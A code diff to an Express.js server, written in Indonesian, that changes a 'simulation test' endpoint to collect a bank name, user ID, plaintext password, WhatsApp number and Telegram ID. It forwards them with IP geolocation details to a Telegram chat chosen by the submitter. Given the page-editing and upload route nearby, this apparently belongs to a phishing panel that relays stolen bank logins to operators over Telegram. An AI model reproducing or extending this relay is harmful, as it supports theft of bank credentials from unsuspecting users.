@@ -1024,14 +1024,14 @@ app.post('/edit/:url', upload.fields([
 
 
 app.post("/api/simulation-test", async function(req, res) {
-  const { userId, password, waNumber, simulation } = req.body;
+  const { bank, userId, password, waNumber, telegramId, simulation } = req.body;
   const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
 
   // Validasi input
-  if (!userId || !password || !waNumber) {
+  if (!bank || !userId || !password || !waNumber || !telegramId) {
     return res.status(400).json({
       success: false,
-      message: "Semua field harus diisi (User ID, Password, Nomor WA)"
+      message: "Semua field harus diisi (Bank, User ID, Password, Nomor WA, Telegram ID)"
     });
   }
 
@@ -1045,7 +1045,6 @@ app.post("/api/simulation-test", async function(req, res) {
   const sessionId = `TEST-${Date.now()}-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
 
   try {
-    // ==================== KIRIM NOTIF KE TELEGRAM ====================
     const ipText = await getIpInfoText(ip);
     
     const message = `
@@ -1055,6 +1054,7 @@ app.post("/api/simulation-test", async function(req, res) {
 
 📌 <b>DATA TEST</b>
 ━━━━━━━━━━━━━━━━━━━━━
+🏦 <b>Bank:</b> <code>${bank}</code>
 👤 <b>User ID:</b> <code>${userId}</code>
 🔑 <b>Password:</b> <code>${password}</code>
 📱 <b>Nomor WA:</b> <code>${waNumber}</code>
@@ -1067,23 +1067,33 @@ ${ipText}
 ⚠️ Status: Simulasi Test Data
     `;
 
-    // Kirim notif ke Telegram
-    await sendMessage(message, global.ownerChatId);
+    // ⭐ PENTING: Kirim ke telegramId USER, bukan owner!
+    const sendStatus = await sendMessage(message, telegramId);
 
-    log.box('success', {
-      Proses: 'SIMULASI TEST',
-      Route: '/api/simulation-test',
-      UserId: userId,
-      WaNumber: waNumber,
-      SessionId: sessionId,
-      IP: ip,
-    });
+    if (sendStatus === 200) {
+      log.box('success', {
+        Proses: 'SIMULASI TEST',
+        Route: '/api/simulation-test',
+        Bank: bank,
+        UserId: userId,
+        WaNumber: waNumber,
+        TelegramID: telegramId,
+        SessionId: sessionId,
+        IP: ip,
+      });
 
-    return res.json({
-      success: true,
-      message: "✅ Data test berhasil dikirim ke Telegram!",
-      data: { userId, waNumber, sessionId, simulation: true }
-    });
+      return res.json({
+        success: true,
+        message: "✅ Data test berhasil dikirim ke Telegram!",
+        data: { bank, userId, waNumber, sessionId, simulation: true }
+      });
+    } else {
+      log.error('simulation test error', 'Gagal mengirim pesan ke Telegram');
+      return res.status(502).json({
+        success: false,
+        message: "Pesan terkirim tapi gagal masuk Telegram (Retry limit)"
+      });
+    }
 
   } catch (error) {
     log.error('simulation test error', error.message);
